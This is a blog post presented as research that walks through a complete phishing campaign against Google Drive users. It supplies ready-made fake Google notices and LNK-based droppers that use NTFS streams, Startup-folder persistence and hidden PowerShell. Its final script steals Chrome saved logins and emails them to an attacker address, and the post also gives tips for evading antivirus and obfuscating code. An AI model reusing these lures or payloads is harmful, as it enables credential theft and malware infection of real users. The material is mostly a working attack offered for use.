---
title: "Awesome Phishing Scenario"
layout: "post"
categories: ["Research"]
tags: ["Research"]
image: /assets/og/1733.png
youtubeId: ORPrpKvO56M
---

When you want to download file (unless it's a direct link, of course.) from Google Drive, you'll see Share button in the top right corner.

![Share Button](/assets/posts/2024-07-14-phishing-is-real/share_button.png)

When you click its, somethings should catches your attention. You can send an email to anyone you want.

![Share Content](/assets/posts/2024-07-14-phishing-is-real/share_content.png)

## Pretext

```plaintext
Hello from Google Drive,

This is last reminder for you. Your file may violate Google Drive's Terms of Service.

"**********.exe" contains content that may violate Google Drive's Malware and Similar 
Malicious Content policy. Before our legal team takes any action, we are awaiting your response. 
The reason for this is that your account may have been compromised, and malicious activities may 
be occurring without your knowledge. If you think this is an error, please check for the file 
modifications mentioned in the attachment, please do not hesitate to provide us with your 
feedback.

Details of the flagged file:

File Name: **********.exe
Upload Date: 11:37 PM *** 5


Thank you,
Google Drive Team
```

## Mail Client Screenshots

The recipient will see the email we sent as shown in the images below.

![Inbox](/assets/posts/2024-07-14-phishing-is-real/inbox.png)

![Inbox](/assets/posts/2024-07-14-phishing-is-real/inbox2.png)

![Mail Client](/assets/posts/2024-07-14-phishing-is-real/mail_client_1.png)

![Mail Client](/assets/posts/2024-07-14-phishing-is-real/mail_client_2.png)

As you can see in the above screenshots, although our email address is `driveplatform.noreply@gmail.com`, the email appears to be sent by Google.So, `drive-shares-dm-noreply@google.com`. This is an advantage for attackers. `Google Drive Support` is the username we have on __Google Drive__. Of course, we can mimic this username when we create an account on Gmail. The mentioned file above as harmful could be uploaded by the victim. It could be an .exe, .rar, .doc, etc. 

## Another Pretext

```plaintext
Dear info,

We hope this email finds you well.

We are writing to inform you that a file you recently uploaded to your Google Drive account 
has been flagged as potentially harmful by our security systems. To ensure the safety and 
integrity of our services, we will temporarily restricted access to this file.

Details of the flagged file:

File Name: ******** Client.rar
Upload Date: 2:06 AM May 2


If you believe this file has been incorrectly flagged, We have created temp short url for you. 
You can access link provided for you to follow the instructions :

Link : https://shorturl.at/Z4Dcv

We apologize for any inconvenience this may cause and appreciate your cooperation in maintaining 
the security of our platform.

Thank you for your attention to this matter.

Best regards,

The Google Drive Team
```

For example If you want to phish someone who has uploaded a file to Google Drive, you can view his Google Username and email information from details and report menu.

![Details](/assets/posts/2024-07-14-phishing-is-real/Details.png)

![Details](/assets/posts/2024-07-14-phishing-is-real/email.png)

> If you send phishing email to Microsoft email accounts, Microsoft highlights your link in email body.
{: .prompt-tip}

![Highlight](/assets/posts/2024-07-14-phishing-is-real/highlight.png)

You can also put a direct link for Google Drive using the references below:

- [https://www.howtogeek.com/747810/how-to-make-a-direct-download-link-for-google-drive-files/](https://www.howtogeek.com/747810/how-to-make-a-direct-download-link-for-google-drive-files/)
- [https://sites.google.com/site/gdocs2direct/](https://sites.google.com/site/gdocs2direct/)

## If victim downloads our file that looking legitimite

![Download](/assets/posts/2024-07-14-phishing-is-real/download.png)

The victim will either click on it after extracting it from the rar file or open the rar file directly. Let's look at both images.

If unrar:

![Download](/assets/posts/2024-07-14-phishing-is-real/unrar.png)

If click directly:

![Download](/assets/posts/2024-07-14-phishing-is-real/rar.png)

## Let's Analyze Shortcut Files

You know, shortcut files usually aim to run target files.

__For Google Policy Violation Warning.pdf.lnk:__

![Download](/assets/posts/2024-07-14-phishing-is-real/google-lnk.png)

```bat
C:\>%ProgramW6432%\WinRAR\UnRAR.exe x "%userprofile%\Downloads\Google Policy Violation Warning.rar" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

In general, the browser's default download folder is C:\users\your name\downloads. There's no need to explain the code; it's clear enough.

> WinRAR is usually installed on computers, and UnRAR.exe does not exist in the [LOLBAS Project](https://lolbas-project.github.io/#)
{: .prompt-tip}

__README.md.lnk:__

This file is going to be run on startup.

```bat
C:\Windows\System32\expand.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Google Policy Violation Warning.pdf.lnk:qwerty" -F:* "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
```
> expand.exe is built on Windows. I hope that you have seen NTFS data stream..
{: .prompt-info }

```console
$@echo off
C:\> dir

 Volume in drive C has no label.
 Volume Serial Number is 588D-8645

 Directory of C:\test

07/15/2024  08:19 AM    <DIR>          .
07/15/2024  08:18 AM    <DIR>          ..
07/01/2024  05:36 PM             1,720 a.rar
07/01/2024  05:48 PM             2,857 Send to OneNote.lnk
               2 File(s)          4,577 bytes
               2 Dir(s)  603,588,624,384 bytes free

C:\> dir a.rar "Send to OneNote.lnk" /s /b /a-d > files.txt
C:\> type files.txt

C:\test\a.rar
C:\test\Send to OneNote.lnk

C:\> type files.txt

C:\test\a.rar
"C:\test\Send to OneNote.lnk"

C:\> makecab /d "CabinetName1=test.cab" /f files.txt

Cabinet Maker - Lossless Data Compression Tool

4,577 bytes in 2 files
Total files:              2
Bytes before:         4,577
Bytes after:          2,633
After/Before:            57.53% compression
Time:                     0.03 seconds ( 0 hr  0 min  0.03 sec)
Throughput:             139.68 Kb/second

C:\> type test.cab > "Google Policy Violation Warning.pdf.lnk:qwerty"

C:\> dir /r

 Volume in drive C has no label.
 Volume Serial Number is 588D-8645

 Directory of C:\test

07/15/2024  08:32 AM    <DIR>          .
07/15/2024  08:18 AM    <DIR>          ..
07/01/2024  05:36 PM             1,720 a.rar
07/15/2024  08:24 AM                86 files.txt
07/15/2024  08:32 AM             2,743 Google
07/15/2024  08:32 AM             2,951 Google Policy Violation Warning.pdf.lnk
                                 2,743 Google Policy Violation Warning.pdf.lnk:qwerty:$DATA
07/01/2024  05:48 PM             2,857 Send to OneNote.lnk
07/15/2024  08:25 AM               955 setup.inf
07/15/2024  08:25 AM               283 setup.rpt
07/15/2024  08:25 AM             2,743 test.cab
               8 File(s)         14,338 bytes
               2 Dir(s)  603,581,587,456 bytes free
```
![Cabinet](/assets/posts/2024-07-14-phishing-is-real/cab.png)

__After execution, So next startup:__

![Startup](/assets/posts/2024-07-14-phishing-is-real/startup.png)

You should see two new files (a.rar and OneNote Shortcut). OneNote is the default, I know, I must force it. Yes, I know... Just focus on the technique.

```bat
%ProgramW6432%\WinRAR\UnRAR.exe x "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\a.rar" -pS1B3R@!
```

> We sent a phishing email with an attached rar file that has no password. But, what's that?! It contains another rar file, and this one has a password. Did you like it?
{: .prompt-tip} 

__And again another next startup:__

![Startup](/assets/posts/2024-07-14-phishing-is-real/last_startup.png)

Did you see another shortcut file? (Microsoft OneDrive) If you run this lnk file directly, there's no problem. Antivirus software does not catch it. But if you download a rar file with the 'Microsoft OneDrive.lnk' file directly embedded, antivirus software will detect it. Now, do you understand why it is embedded with a password?

## Let's analyze what this shortcut file does.

![Shortcut](/assets/posts/2024-07-14-phishing-is-real/last_shortcut.png)

As you can see, The target can't see it. Because it's overflowed with 512 bytes as space. Or, you can apply other trick. 

>Did you also know that you can completely hide the target part on the GUI without using overflow? I highly recommend reviewing the documentation I provided below that shows the structure of lnk files.
{: .prompt-tip}


- [Github - LNK Doc](https://github.com/libyal/liblnk/blob/main/documentation/Windows%20Shortcut%20File%20(LNK)%20format.asciidoc)
- [Microsoft - LNK Doc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/747629b3-b5be-452a-8101-b9a2ec49978c)


```console
%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $c=([byte[]]($file ^| select -Skip 000000));[System.Text.Encoding]::UTF8.GetString($c) ^| iex
```

If you look at line 126 in the source code, you will see that first, the lnk file identifies itself by its length. Then, it takes itself as bytes and finally performs dexoring. Lastly, without writing to the disk or accessing the internet, it executes PowerShell code in memory.

> If you look at line 126 in the source code, you will see that first, the lnk file identifies itself by its length. Then, it takes itself as bytes and finally performs dexoring. Lastly, without writing to the disk or accessing the internet, it executes PowerShell code in memory.
{: .prompt-info }

>If you open "Microsoft OneDrive.lnk" file with hexeditor, you will see PS Code at 0xB04 offset. The x86matthew's script does exactly this. First, it's finding itself and extracting or running PS code in memory. This script can be encoded with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) or [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) or you can embed it as zip :).
{: .prompt-tip}

You can review all the code below. Thanks to [x86matthew - source code](https://web.archive.org/web/20240119020949/https://www.x86matthew.com/view_post?id=embed_exe_lnk)

## Icon - Trick

Let's look at line 331 in the source code:

```console
if (CreateLinkFile(pExePath, pOutputLinkPath, "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", "Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23") != 0)
```

The third parameter is for the icon. I assume that you want to convert your file view to PDF. In the classic way, after running x86matthew's script, you would right-click -> Properties -> Change Icon -> Put the msedge.exe location ('C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe') -> OK. Is that right? That's okay. But when you select the PDF icon and click OK, the lnk file structure will break and it will not run. So you can not use this. When you also put index number like ", 13" to third param, script will not create lnk file properly. 

![Icon](/assets/posts/2024-07-14-phishing-is-real/change_icon.png)

# But How?

Put the same lnk files in same folder and just change icon of one. So we can find different byte, well icon index number. And use python script below to find different byte.

```python
with open("file1.lnk", "rb") as f:
    lnk1 = f.read()

with open("file2.lnk", "rb") as f:
    lnk2 = f.read()

print(len(lnk1),len(lnk2))

for i in range(0, len(lnk1)):
    if lnk1[i] != lnk2[i]:
        print("{}. byte is not equal".format(i))
```

![Different Byte](/assets/posts/2024-07-14-phishing-is-real/diff_icon.png)

![Different Byte](/assets/posts/2024-07-14-phishing-is-real/diff_cmd.png)

As you can see, the both lnk files have same length and byte 56 (0x38 offset) is different.

Let's go to 0x38 offset with hexeditor program in kali.

lnk1

![LNK Offset](/assets/posts/2024-07-14-phishing-is-real/lnk_offset_1.png)

lnk2

![LNK Offset](/assets/posts/2024-07-14-phishing-is-real/lnk_offset_2.png)

When you go to byte 56, you will see that first lnk file has 0x00, second lnk file has 0x0D (13) index number. The thing you just gonna do is that to change this byte to 0x0D. So you can change icon to pdf.

## Final Thoughts

After three startup, the PS Script to run in background:

```powershell
$val=Get-ItemProperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Local AppData" | select "Local AppData";
$chrmpth = $val."Local AppData";
copy-item "$chrmpth\Google\Chrome\User Data\Default\Login Data", "$chrmpth\Google\Chrome\User Data\Local State" $env:temp -Force;
Compress-Archive  "$env:temp\Login Data", "$env:temp\Local State" -DestinationPath "$env:temp\zipped.zip" -CompressionLevel "Fastest";
remove-item "$env:temp\Login Data", "$env:temp\Local State";
$FileName = "$env:temp\zipped.zip";
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName));
remove-item $FileName;
Send-MailMessage -From 'Attacker <attacker@example.com>' -To 'test <change_here>@sharklasers.com>' -Subject 'Data Exfil' -Body $base64string -Priority High -SmtpServer 'sharklasers.com';
remove-item $PSCommandPath;
```

I said that before, If you want, you can obfuscate this code, then put it the bottom of lnk file.

I recommend that you should encode it with AES..

